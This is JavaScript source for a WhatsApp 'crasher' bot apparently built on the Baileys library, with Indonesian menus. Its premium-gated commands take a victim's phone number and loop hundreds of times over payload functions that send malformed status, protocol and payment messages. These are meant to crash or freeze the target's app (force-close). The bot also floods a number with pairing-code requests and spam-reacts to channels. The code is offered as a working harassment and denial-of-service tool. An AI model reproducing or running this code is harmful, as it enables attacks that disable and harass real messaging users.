    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "VannHost Is Heree Baybyy" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
//======================
switch (command) {
//case bug
case "ambuky-delay": {
  if (!isPremium) return m.reply('Lu Siapa Kocakk');
  if (!text) return m.reply(`Contoh: ${prefix + command} 628xxxxx`);
  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  m.reply(`✅ Bug berhasil dikirim ke: *${target}* 😈`);

  for (let i = 0; i < 870; i++) {
    await carouselNew(target)
    await bulldozer(target)
    await carouselNew(target)
    await bulldozer(target)
    await DelayStc(langgxyz, target)
    await DelayStc(langgxyz, target)
    await carouselNew(target)
    await bulldozer(target)
    await carouselNew(target)
    await bulldozer(target)
    await DelayStc(langgxyz, target)
    await DelayStc(langgxyz, target)       
    await SockMentionJid3(target, false)
    await SockMentionJid3(target, false)
    await SockMentionJid3(target, false)
    await BaccaratUi(langgxyz, target)
    await BaccaratUi(langgxyz, target)
    await BaccaratUi(langgxyz, target)
    await CosmoBlankX(target) 
    await CosmoBlankX(target) 
    await CosmoBlankX(target) 
    await CosmoBlankX(target)
  }
}
break;

case "ambuky-invisble": {
  if (!isPremium) return m.reply('Lu Siapa Kocakk');  
  if (!text) return m.reply(`Contoh: ${prefix + command} 628xxxxx`);
  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  m.reply(`✅ Bug berhasil dikirim ke: *${target}* 😈`);

  for (let i = 0; i < 879; i++) {
    await protocolbug2(target, true)
    await protocolbug1(target, true) 
    await protocolbug2(target, true)
    await protocolbug3(target, true)
    await protocolbug4(target, true)
    await VampPaymentCrash(target, true)
    await protocolbug5v2(target, true)
    await protocolbug5v2(target, true)
    await protocolbug5v2(target, false)
    await protocolbug5v2(target, false)
    await protocolbug5(target, true)
    await protocolbug5(target, true)
    await protocolbug5(target, true)
    await protocolbug5(target, true)
    await protocolbug5(target, false)
    await protocolbug5(target, false)
    await protocolbug5(target, false)
    await protocolbug5(target, false)
    await VampDelayMess(langgxyz, target)
    await VampPrivateBlank(langgxyz, target)
    await VampDelayCrash(langgxyz, target)
    await VampBroadcast(langgxyz, target, true)
    await mentionSw(target)
    await carouselNew(target)
  }
}
break;

case "ambuky-bulldozer": {
  if (!isPremium) return m.reply('Lu Siapa Kocakk');
  if (!text) return m.reply(`Contoh: ${prefix + command} 628xxxxx`);
  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  m.reply(`✅ Bug berhasil dikirim ke: *${target}* 😈`);

  for (let i = 0; i < 879; i++) {
    await bulldozer(target);
    await bulldozer(target);
    await bulldozer(target);
    await bulldozer(target);
  }
}
break;

case "ambuky-delaysystem": {
  if (!isPremium) return m.reply('Lu Siapa Kocakk');  
  if (!text) return m.reply(`Contoh: ${prefix + command} 628xxxxx`);
  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  m.reply(`✅ Bug berhasil dikirim ke: *${target}* 😈`);

  for (let i = 0; i < 879; i++) {
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await protocolbug5(target, true)
    await protocolbug5(target, true)
    await protocolbug5(target, true)
    await protocolbug5(target, true)
    await protocolbug5(target, false)
    await protocolbug5(target, false)
    await protocolbug5(target, false)
    await protocolbug5(target, false)
  }
}
break;

case "x-ambuky-combo-z": {
  if (!isPremium) return m.reply('𝚕𝚞 𝚋𝚞𝚔𝚊𝚗 ditz kontol');  
  if (!text) return m.reply(`Contoh: ${prefix + command} 628xxxxx`);
  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  m.reply(`✅ Bug berhasil dikirim ke: *${target}* 😈`);

  for (let i = 0; i < 879; i++) {
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
  }
}
break;

case 'ambuky-fc': {
  if (!isCreator) return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
  if (!q) return m.reply(`⚠️ Contoh: ${command} 62xxxx`);
  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`✅ Bug berhasil dikirim ke: *${target}* 😈`);

  for (let i = 0; i < 30; i++) {
    await forclose(target);
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await forclose(target)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
    await ProtoXAudio(target, true)
  }
}
break;
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === true) return m.reply("𝙻𝙰𝙷 𝙳𝙰𝚁𝙸 𝚃𝙰𝙳𝙸 𝚄𝙳𝙰𝙷 𝙿𝚄𝙱𝙻𝙸𝙲 KOCAK😹");
rikz.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === false) return m.reply("𝙳𝙰𝚁𝙸 𝚃𝙰𝙳𝙸 𝚄𝙳𝙰𝙷 𝚂𝙴𝙻𝙵 WOE🤡");
rikz.public = false
m.reply(mess.succes)
}
break
//======================
case "menu": {
let itsmenu = 
`╔═══════════════════════╗
║  🔰 *𝙰𝙼𝙱𝚄𝙺𝚈 CRASER 𝚅𝟷 𝚅𝚅𝙸𝙿 !!* 🔰
╚═══════════════════════╝
👋 𝙷𝚎𝚕𝚕𝚘, *${pushname}!* 𝙷𝚊𝚟𝚎 𝙰 𝙽𝚒𝚌𝚎 𝙳𝚊𝚢!

╭──⭓ *『 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 』* ──╮
│ 🧑‍💻 *Developer* : VANN HOSTING
│ 🔗 *Action*    : https://linkgc-vannhost.vercel.app
│ 🛠️ *Version*   : 1.0
╰──────────────────────╯

╭─❏ *『 魔 BUG MENU 』* ❏─╮
│ ➤ 𝙰𝙼𝙱𝚄𝙺𝚈-𝙵𝙲 <𝙽𝚄𝙼𝙱𝙴𝚁>
│ ➤ 𝙰𝙼𝙱𝚄𝙺𝚈-𝙳𝙴𝙻𝙰𝚈 <𝙽𝚄𝙼𝙱𝙴𝚁>
│ ➤ 𝙰𝙼𝙱𝚄𝙺𝚈-𝙸𝙽𝚅𝙸𝚂𝙱𝙻𝙴 <𝙽𝚄𝙼𝙱𝙴𝚁>
│ ➤ 𝙰𝙼𝙱𝚄𝙺𝚈-𝙳𝙴𝙻𝙰𝚈𝚂𝚈𝚂𝚃𝙴𝙼 <𝙽𝚄𝙼𝙱𝙴𝚁>
│ ➤ 𝙰𝙼𝙱𝚄𝙺𝚈-𝙱𝚄𝙻𝙻𝙳𝙾𝚉𝙴𝚁 <𝙽𝚄𝙼𝙱𝙴𝚁>
│ ➤ 𝚇-𝙰𝙼𝙱𝚄𝙺𝚈-𝙲𝙾𝙼𝙱𝙾-𝚉 <𝙽𝚄𝙼𝙱𝙴𝚁>
╰──────────────────────╯

╭─❏ *『 🎉 FUN MENU 』* ❏─╮
│ ➤ 𝚂𝙿𝙰𝙼𝚁𝙴𝙰𝙲𝚃𝙲𝙷 <𝙻𝙸𝙽𝙺 𝙿𝙴𝚂𝙰𝙽>
│ ➤ 𝙰𝙿𝙰𝙼𝙿𝙰𝙸𝚁𝙸𝙽𝙶 <𝙽𝚄𝙼𝙱𝙴𝚁>
╰──────────────────────╯

╭─❏ *『 👑 OWNER MENU 』* ❏─╮
│ ➤ 𝙰𝙳𝙳𝙼𝚄𝚁𝙱𝚄𝙶 <𝙽𝚄𝙼𝙱𝙴𝚁>
│ ➤ 𝙳𝙴𝙻𝙼𝚄𝚁𝙱𝚄𝙶 <𝙽𝚄𝙼𝙱𝙴𝚁>
│ ➤ 𝙿𝚄𝙱𝙻𝙸𝙲
│ ➤ 𝚂𝙴𝙻𝙵
╰──────────────────────╯

✨ *『 𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊 』* ✨
• 🙏 _Vann Hosting_ </Developer/>
• 🫶 _Orang Tua_ </Support/>
• 🕋 _Allah Swt_ </My God/>

🔒 © ᴠᴀɴɴ ʜᴏsᴛɪɴɢ - ᴅᴇᴠᴇʟᴏᴘᴇʀ`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/5kixbj.jpg" },
caption: itsmenu
}, { quoted: m });
}
break; 
//======================
case "addmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("Example: /addmurbug (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`𝚗𝚘𝚖𝚘𝚛 ${user} 𝚝𝚎𝚕𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚖𝚞𝚛𝚋𝚞𝚐`)}
break;
//======================
case "delmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("Example: /delmurbug (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `𝚗𝚘𝚖𝚘𝚛 ${user} 𝚍𝚒 𝚑𝚊𝚙𝚞𝚜 𝚍𝚊𝚛𝚒 𝚖𝚞𝚛𝚋𝚞𝚐 𝚍𝚊𝚗 𝚝𝚊𝚔 𝚋𝚒𝚜𝚊 𝚖𝚎𝚗𝚐𝚊𝚔𝚜𝚎𝚜 𝚋𝚘𝚝 𝚒𝚗𝚒` : "𝚞𝚜𝚎𝚛 𝚝𝚎𝚕𝚊𝚑 𝚍𝚒 𝚑𝚒𝚕𝚊𝚗𝚐𝚔𝚊𝚗")}
break;
//======================
//case reactch
  case "spamreactch": {

if (!isPremium) return m.reply('𝚘𝚗𝚕𝚢 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚞𝚜𝚎𝚛');

if (!text) return m.reply(".spamreactch linkpesan 😈")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await rikz.newsletterMetadata("invite", result)

await rikz.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
//======================
case 'spampairing': {
  if (!isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}